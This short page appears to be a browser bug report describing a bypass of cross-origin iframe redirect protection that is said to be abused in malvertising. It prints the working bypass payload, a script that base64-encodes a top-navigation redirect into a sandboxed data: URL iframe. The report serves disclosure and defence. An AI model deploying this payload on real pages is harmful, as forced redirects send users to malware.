<h1>Problem Description</h1>
<p>Consider the following payload that will always get blocked when served in a cross-origin iframe:</p>
<div>&lt;script&gt;
    top.window.location = &quot;https://google.com&quot;;
&lt;/script&gt;
</div>
<p>There exists a bug that bypasses this built-in mitigation and it&#39;s currently being leveraged as part of a malvertising chain to bypass the browser&#39;s redirect protection in order to drive traffic to malware.</p>
<p>The following payload is being used:</p>
<div>&lt;script type=&quot;text/javascript&quot;&gt;
  var x = &#39;&lt;html&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt; window.top.location = &quot;https://google.com&quot;;&#39; + &#39;&lt;/scr&#39; + &#39;ipt&gt;&lt;/body&gt;&lt;/html&gt;&#39;;
  var bs64 = btoa(x);
  document.write(&#39;&lt;iframe sandbox=&quot;allow-top-navigation allow-scripts&quot; src=&quot;data:text/html;base64,&#39; + bs64 + &#39;&quot;&gt;&lt;/iframe&gt;&#39;)
&lt;/script&gt;
</div>
